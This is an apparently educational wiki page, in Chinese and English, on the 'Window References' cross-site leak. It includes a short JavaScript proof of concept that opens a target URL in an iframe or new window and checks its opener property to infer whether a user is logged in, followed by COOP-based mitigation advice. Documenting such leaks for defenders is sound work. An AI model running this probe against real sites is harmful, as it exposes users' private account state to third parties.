+++
title = "窗口引用"
description = ""
date = "2020-10-08"
category = [
    "Attack",
]
abuse = [
    "Window References",
]
defenses = [
    "Fetch Metadata",
    "SameSite Cookies",
    "COOP"
]
menu = "main"
weight = 2
+++

如果一个页面将其 `opener` 属性设置为 `null` 或使用 [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) 取决于用户的状态进行防护，就有可能推断出关于该状态的跨站信息。例如，攻击者可以在 iframe（或一个新窗口）中打开一个只有认证用户才能访问的地址来检测用户是否登录，只需要检查它的 window reference 即可。

If a page sets its `opener` property to `null` or is using [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) protection depending on the users' state, it becomes possible to infer cross-site information about that state. For example, attackers can detect whether a user is logged in by opening an endpoint in an iframe (or a new window) which only authenticated users have access to, simply by checking its window reference. 

## 代码片段
下面的片段演示了如何检测 `opener` 属性是否被设置为`null`，或者 [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) 头是否不为 `unsafe-none`。这在 iframes 和新窗口中都可以进行。

The below snippet demonstrates how to detect whether the `opener` property was set to `null`, or whether the [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) header is present with a value other than `unsafe-none`. This can be done with both iframes and new windows.

```javascript
// 有漏洞的 URL
const v_url = 'https://example.org/profile';

const exploit = (url, new_window) => {
  let win;
  if(new_window){
    // 在新标签页中打开 url 来确定 win.opener 是否收到 COOP 的影响
    // 或者置为 null
    win = open(url);
  }else{
    // 新建一个 iframe 来检测 opener 是否定义
    // COOP 检测无法使用，有 framing protections 保护的也无法使用
    document.body.insertAdjacentHTML('beforeend', '<iframe name="xsleaks">'); 
    // 重定向 iframe 到有漏洞的 url
    win = open(url, "xsleaks");
  }
  
  // 延时 2s，等页面加载
  setTimeout(() => {
    // 检查新打开的 windows 的 opener 属性
    if(!win.opener) console.log("win.opener is null");
    else console.log("win.opener is defined");
  }, 2000);
}
exploit(v_url);
exploit(v_url, 1);
```

## 防御
为了减少这种类型的 XS-Leak，在不同的页面上要保持一致：使用 COOP 将所有页面上的 `opener` 属性设置为相同的值。使用 JavaScript 将 `opener` 设置为 `null` 会导致一些极端情况下的问题，因为通过 iframe 的沙盒属性是可以禁用 JavaScript 的。

To mitigate this type of XS-Leak, be consistent across different pages: set the `opener` property to the same value on all pages using COOP. Using JavaScript to set `opener` to `null` can result in edge cases because it's possible to disable JavaScript entirely using iframe's sandbox attribute.
